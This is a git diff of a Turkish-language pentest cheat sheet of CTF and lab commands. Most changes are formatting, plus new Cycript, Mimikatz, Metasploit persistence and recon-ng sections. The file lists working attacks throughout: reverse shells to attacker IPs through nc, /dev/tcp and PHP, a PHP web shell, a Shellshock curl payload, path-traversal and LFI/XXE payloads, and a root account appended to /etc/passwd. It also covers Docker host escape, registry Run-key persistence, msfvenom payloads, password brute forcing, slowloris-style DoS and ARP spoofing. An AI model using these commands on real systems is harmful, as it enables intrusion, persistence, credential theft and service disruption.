@@ -1,9 +1,11 @@
 # Pentest El-Kitabı
 
 # SH to Bash #
+
 /bin/bash -i yada python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Hashcat Kullanım Örneği #
+
 -m ---> Hash türünü belirtmek için kullanılır.
 
 0 ---> Kütüphanede ki hash'in sayısı
@@ -17,17 +19,25 @@
 hashcat -m 0 "UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds" /usr/share/wordlists/rockyou.txt --force
 
 # GCC Compile #
+
 -o ---> dosyanın çıktısının ismi.
 
 gcc -o örnek.c/py/rb
 
 # Python ile PC servis etme #
+
 python3 -m http.server
 
 # CTF'ler için basic NMAP komutu #
+
 nmap -sV -sC -A -T4 <ip.adress>
 
+nmap -iL list_of_hosts.txt
+
+nmap -PR -sn 10.10.210.6/24
+
 # Dirb Örnek Basic Kullanım #
+
 dirb http://<ip.adress> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 # JohnTheRipper Örnek Kullanımlar #
@@ -43,16 +53,19 @@ hashcat -m 13600 backup.hash /usr/share/wordlists/rockyou.txt
 ssh2john id_rsa > aa.txt ---> id_rsa'leri kırmak için.
 
 # SMB'ye bakmak için #
+
 smbclient -L <ip.adress> ---> Full enum
 
 smbclient //<ip.adress>/<Bakmak istediğiniz dosyanın ismi>
 
 # SCP kullanımı #
+
 scp /root/37292.c <Kullanıcının ismi>@<ip.adress>:/tmp ---> Karşı tarafa ssh ile dosya aktarımı
 
 scp <Kullanıcının ismi>@<ip.adress>:/home/james/Alien_autospy.jpg ---> Karşı taraftan ssh ile dosya çekme
 
 # ECHO kullanımları #
+
 echo -n "<Rot13-HasH>" | tr 'A-Za-z' 'N-ZA-Mn-za-m' ---> ROT13 hash decode
 
 echo -n "Base64-Hash" | base64 -d ---> Base64 Hash decode
@@ -79,6 +92,7 @@ wpscan --url < URL > --username elyana --password /usr/share/wordlists/rockyou.t
 wpscan --url jack.thm -e u -P /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Otomatik.
 
 # GOBUSTER Kullanımı #
+
 gobuster dir -u < URL > -w < Wordlist >
  
 gobuster dir -u < URL > -w < Wordlist > -x php,txt,html,bak,old,tar,gz,tgz,zip,7z ---> '-x' uzantılı dosyaları aramak için kullan.
@@ -86,11 +100,13 @@ gobuster dir -u < URL > -w < Wordlist > -x php,txt,html,bak,old,tar,gz,tgz,zip,7
 gobuster dir -U < User > -P < Şifre > -u < URL > -w < Wordlist > ---> Id ve Şifre verilmesi gereken yer için.
  
 # StegHide Kullanımı #
- steghide info < Img ismi > ---> Resimde saklı herhangi bir dosya var mı ?
+
+steghide info < Img ismi > ---> Resimde saklı herhangi bir dosya var mı ?
 
 steghide extract -sf < Img ismi > ---> Resimde saklı dosya varsa çıkart.
 
 # Mac Changer #
+
 ifconfig eth0 down ---> ETH0 bağlantısını keser.
 
 ifconfig eth0 hw ether 00:11:22:33:44:55 ---> İstediğin MAC adresini atar.
@@ -98,6 +114,7 @@ ifconfig eth0 hw ether 00:11:22:33:44:55 ---> İstediğin MAC adresini atar.
 ifconfig eth0 up ---> ETH0 bağlantısını kurar.
  
 # SQL Map #
+
 sqlmap -r request --dbs --batch ---> Database ve kullanıcıları çıkarır.
 
 sqlmap -r request --dbs --batch -D wordpress --tables ---> Database'de ki tabloları gösterir.
@@ -126,6 +143,7 @@ gobuster dir -U joker -P hannah -u http://10.10.9.219:8080/ -x bak,old,tar,gz,tg
 gobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/dirb/common.txt
  
 # Sudo #
+
 sudo -l ls -la
 
 sudo -u toby /bin/bash
@@ -138,6 +156,7 @@ import os
 os.system("/bin/bash")
 
 # Hydra #
+
 hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.9.219 ssh -vV
 
 hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.32.242 http-get ----> Basic Auto - Get Metod.
@@ -151,9 +170,11 @@ hydra -l admin -P rockyou.txt 10.10.159.24 http-post-form “/login/index.php:us
 hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.117.44:55007 -Vv 
 
 # Basic HashID #
+
 hashid -m $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
 
 # Tunnel #
+
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f
 
 -c 'bash -i >& /dev/tcp/10.9.1.69/4486 0>&1'
@@ -167,15 +188,17 @@ php -r '$sock=fsockopen("10.9.0.229",4485);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f'); ?>
 
 # ARP Scanner #
+
 arp-scan -I eth0 192.168.240.128/24
 
 arp -a
 
-## SSH ##
+# SSH #
 
 ssh -i id_rsa jessie@10.10.176.189
 
 # Testing Web App #
+
 http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
 
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log
@@ -185,6 +208,7 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.
 http://10.10.216.6:22/nnxhweOV/index.php?cmd=nc%20-e%20/bin/bash%2010.11.9.81%2080%209999
 
 # Find #
+
 find / -name elyana 2>/dev/null - - - - SHELL=/bin/bash script -q /dev/nulls - Meterpreter
 
 find / -user hermonine -type f 2>/dev/null
@@ -200,17 +224,21 @@ find / -type f -group lxd -exec ls -l {} + 2>/dev/null
 find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) -exec ls -la {} \; 2>/dev/null
 
 # LTrace #
+
 ltrace /usr/sbin/checker
 
 # Docker #
+
 docker images
 
 docker run -v /:/mnt --rm -it bash chroot /mnt bash
 
 # Head #
+
 head asd.txt -c 9
 
 # Curl #
+
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.9.1.69/4485 0>&1' http://10.10.183.66/cgi-bin/test.cgi
 
 curl 'http://10.10.90.19/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.0.229/4485 0>&1' -H "Content-Type: text/plain"
@@ -220,6 +248,7 @@ curl -s http://www.team.thm/scripts/script.old
 curl -s 10.10.83.164 -D header.txt
 
 # GPG - GPGToJohn #
+
 gpg --import priv.key
 
 gpg --decrypt-file CustomerDetails.xlsx.gpg
@@ -254,6 +283,7 @@ pop graphic-context
 EOF
  
 # FUZZ FUF # 
+
 wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0
 
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
@@ -263,15 +293,19 @@ wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://10.10.244.142:500
 ffuf -w wordlist.txt -u https://target .com/FUZZ -mc 200
 
 # GetCap #
+
 getcap -r / 2>/dev/null
 
 # EnumForLinux #
+
 enum4linux -a 10.10.16.141
 
 # XXD #
+
 xxd thm.jpg | head
 
 # Printf - OpenSSL #
+
 printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
 
 openssl passwd -1 -salt "inferno" "dante"
@@ -279,28 +313,36 @@ openssl passwd -1 -salt "inferno" "dante"
 printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
 
 # Rabin #
+
 rabin2 -z need_to_talk
 
 # NetStat #
+
 netstat -putan
 
 # ECHO Writing #
+
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f" > /home/server-management/Documents/rev.sh
 
 # SOCAT #
+
 ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
 
 # XLM Test #
+
 "!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"
 
 # CD D:/ #
+
 cd /d d:
 
 # Shell #
+
 ECHO $SHELL
 chsh -s /bin/bash root
 
 # Google #
+
 OR ---> veya için kullanılır.
 
 inurl: ---> urlde geçen sonuçlar için.
@@ -316,17 +358,18 @@ allintext: ---> Tüm textin içerisinde arama yapmak için. Örn: allintext:"@gm
 buildwith.com
 
 # NetDiscover #
+
 netdiscover -r 182.154.164.1/24
 
 # Redirect Port #
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
-## NetCat ##
+# NetCat #
 
 nc -lvnp 10.10.10.10 80
 
-## Windows Embed ##
+# Windows Embed #
 
 C:\Users\Windows\AppData\Local\Programs\Python\Python310\python.exe -m install pyinstaller
 
@@ -338,11 +381,11 @@ C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe
 
 C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." --noconsole --icon C\Users\Defult\Desktop\kal.pdf
 
-## Regedit ##
+# Regedit #
 
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d "C:\Users\AppData\upgrade.exe"
 
-## Spike ##
+# Spike #
 
 generic_send_tcp 10.10.10.10 9999 spike.spk 0 0
 
@@ -354,11 +397,11 @@ cd /usr/share/metasploit-framework/tools/exploit ./nasm_shell.rb ---> JMP ESP
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" ---> badcharacter
 
-## Locate ##
+# Locate #
 
 locate < dosyanın tam adı >
 
-## Ngrok Msfvenom ##
+# Ngrok Msfvenom #
 
 ./ngrok tcp 4444
 
@@ -368,7 +411,7 @@ service postgresql start
 
 msfconsole use exploit/multi/handler set payload - LHOST=0.0.0.0 - LPORT=4444
 
-## APK İmzalama ##
+# APK İmzalama #
 
 install jdk
 
@@ -378,23 +421,23 @@ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.
 
 jarsigner -verify -verbose -certs android_shell.apk
  
- ## Türkçe Klavye ##
+# Türkçe Klavye #
 
 setxkbmap tr
 
-## App-Debug-APKTOOL ## 
+# App-Debug-APKTOOL ##
 
 apktool d app-debug-apk
 
 apktool b app-debug -o newapk.apk
 
-## JDX ##
+# JDX #
 
 jadx -d appdebug appdebug.apk
 
 jadx -d appdebug appdebug.apk --deobf
 
-## FireBase ##
+# FireBase #
 
 https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/cities/LA
 
@@ -404,7 +447,7 @@ curl -X GET "https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databa
 
 curl -X DELETE "https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/<Koleksiyon Adı>/<ID>";
 
-## DOS Attack ##
+# DOS Attack #
 
 slowhttptest -c 1000 -H -r 200 -c 400 -i 10 -t POST -l 3600 -o ~/Desktop/slow-test1 -g -u https://pentesturl.xyz
 
@@ -418,7 +461,7 @@ slowhttptest -c 2000 -X -r 200 -w 2048 -y 4096 -n 3 -z 32 -k 2 -p 3 -l 3600 -o ~
 
 slowhttptest -c 3000 -B -r 300 -i 100  -s 8192 -t fakeverb -p 3 -x 20 -o ~/Desktop/slow-test6 -g -u https://pentesturl.xyz
 
-## Airmon-NG ##
+# Airmon-NG #
 
 airmon-ng start wlan0
 
@@ -444,17 +487,17 @@ ifconfig wlan0 mode monitor
 
 ifconfig wlan0 up
 
-## ADB ##
+# ADB #
 
 am start -n com.android.asdad/.PostLogin
 
 content query --uri content://com.android.asdasd.TrackUserContentProvider/trackusers
 
-## crunch ##
+# crunch #
 
 crunch 8 9 xy123 -o testwordlists
 
-## BetterCap ##
+# BetterCap #
 
 bettercap -iface wlan0
 
@@ -470,9 +513,73 @@ arp.spoof on
 
 net.sniff on
 
-## Port Kullanımı ##
+# Port Kullanımı #
 
 lsof -i 80
+
+# Cycript Kullanımı #
+
+cycript -p <AppName>
+
+UIApp
+
+UIApp.keyWindow.rootViewController -- Cycript Tricks
+
+printMethods("ViewController")
+
+UIApp.keyWindow.rootViewController = [[SecondViewController alloc]init]
+
+ViewController.prototype.isJailbroken = function() {return false;}
+
+# Mimikatz #
+
+lsadumb:Sam 
+
+# Metasploit Persistence #
+
+use exploit/windows/local/persistence
+
+set EXE::CUSTOM payload.exe
+
+# WHOIS / Nslookup / Dig / Host / TraceRoute / Shodan #
+
+whois thmredteam.com
+
+nslookup cafe.thmredteam.com
+
+dig @1.1.1.1 tryhackme.com
+
+host clinic.thmredteam.com
+
+traceroute clinic.thmredteam.com
+
+shodan host 167.86.125.151 
+
+# Recon-NG #
+
+workspaces create thmredteam
+
+recon-ng -w WORKSPACE_NAME
+
+recon-ng -r asd
+
+db insert domains
+
+marketplace search domains-
+
+marketplace install google_site_web
+
+modules load viewdns_reverse_whois
+
+options list
+
+options set
+
+keys list
+
+keys add KEY_NAME KEY_VALUE
+
+keys remove KEY_NAME
 
 
 
